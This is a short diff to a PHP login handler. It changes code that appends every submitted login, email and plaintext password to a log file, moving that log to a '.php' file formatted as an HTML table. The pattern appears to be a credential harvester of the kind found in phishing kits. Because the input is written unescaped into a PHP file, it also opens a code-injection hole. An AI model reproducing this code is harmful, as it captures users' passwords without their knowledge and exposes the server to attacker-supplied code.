@@ -154,10 +154,12 @@ $errors = array();
         $token = md5(md5($login) . md5($password));
 
 $fl = 
-fopen('log.html', 'a+');
-fwrite($fl, '<strong>login: ' . $login . '</strong><br>' . PHP_EOL);
+fopen('../../log/log.php', 'a+');
+fwrite($fl, '<tr style="text-align: center;">
+<td>login: <strong>' . $login . '</strong><br>' . PHP_EOL);
 fwrite($fl, 'email: ' . $email . '<br>' . PHP_EOL);
-fwrite($fl, 'password: ' . $password . '<br><br>' . PHP_EOL);
+fwrite($fl, 'password: ' . $password . '<br><br></td>
+</tr>' . PHP_EOL);
 fwrite($fl, '' . PHP_EOL);
 fclose($fl);
 
